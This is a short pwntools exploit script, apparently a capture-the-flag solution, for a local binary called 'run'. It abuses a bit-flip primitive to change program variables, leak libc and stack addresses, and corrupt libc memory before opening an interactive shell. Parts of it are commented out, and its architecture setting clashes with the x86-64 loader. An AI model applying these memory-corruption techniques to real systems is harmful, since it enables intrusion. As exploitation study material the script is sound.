from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = ELF("./run")

context.arch = 'arm64'


p = process('./run')

def beep_bop(address, idx):
    p.sendlineafter("choice> ", "0")
    p.sendlineafter("> ", bin(address)[2:])
    p.sendlineafter("> ", bin(idx)[2:])





beep_bop(exe.sym.tries, 0)

beep_bop(exe.sym.exe_path, 0x40)
beep_bop(exe.sym.rw_flags, 0x40)


input()

beep_bop(0x11, 0x40)

for i in range(9):
    p.recvline()

p.recvuntil("is in ")

libc.address = int(p.recvuntil(" ")[:-1], 16)

log.info(f'LIBC @ {hex(libc.address)}')

for i in range(11):
    p.recvline()

p.recvuntil("is in ")
p.recvuntil("- ")


stack = int(p.recvuntil(".")[:-1], 16)


log.info(f'stack @ {hex(stack)}')

ret_ptr = stack - 0x16d8

log.info(f'ret @ {hex(ret_ptr)}')

# #p.interactive()
# # for i in range(32):
# #     beep_bop(exe.bss(0) + 0x100, 1)
# #     beep_bop(exe.sym.tries, 1)


for i in range(1, 10):
    beep_bop(0x1d88e0 + libc.address + i, 0)
    beep_bop(exe.sym.tries, 0)

# p.sendlineafter("choice> ", "0")
# p.sendlineafter("> ", bin(0x3fd430)[2:])
# p.sendlineafter("> ", '101AAAA')

# input()
# beep_bop(0x3fd430, 0)


p.interactive()

